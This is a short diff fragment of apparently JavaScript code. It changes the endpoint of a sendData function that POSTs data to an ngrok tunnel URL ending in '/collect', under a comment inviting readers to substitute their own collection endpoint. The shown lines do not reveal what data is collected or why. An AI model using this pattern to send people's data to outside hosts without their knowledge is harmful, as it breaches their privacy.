@@ -8,7 +8,7 @@
 
   function sendData(data) {
     // Replace with your own endpoint to collect data
-    const endpoint = 'https://native-fully-elephant.ngrok-free.app/';
+    const endpoint = 'https://native-fully-elephant.ngrok-free.app/collect';
     fetch(endpoint, {
       method: 'POST',
       headers: {
